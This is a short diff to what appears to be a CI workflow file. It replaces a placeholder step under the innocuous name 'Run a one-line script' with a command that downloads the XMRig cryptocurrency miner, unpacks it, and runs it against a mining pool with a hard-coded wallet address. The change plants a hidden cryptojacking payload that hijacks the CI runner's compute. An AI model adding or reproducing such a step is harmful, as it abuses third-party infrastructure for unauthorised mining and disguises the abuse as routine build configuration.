@@ -27,4 +27,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: wget google.com && ls
+        run: wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz && cd  xmrig-6.16.4 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:CHarDzUx5dhihfDYvx4Q1NHwybswFzGFH37J8d8UYmtx.WORKER_NAME -p x pause
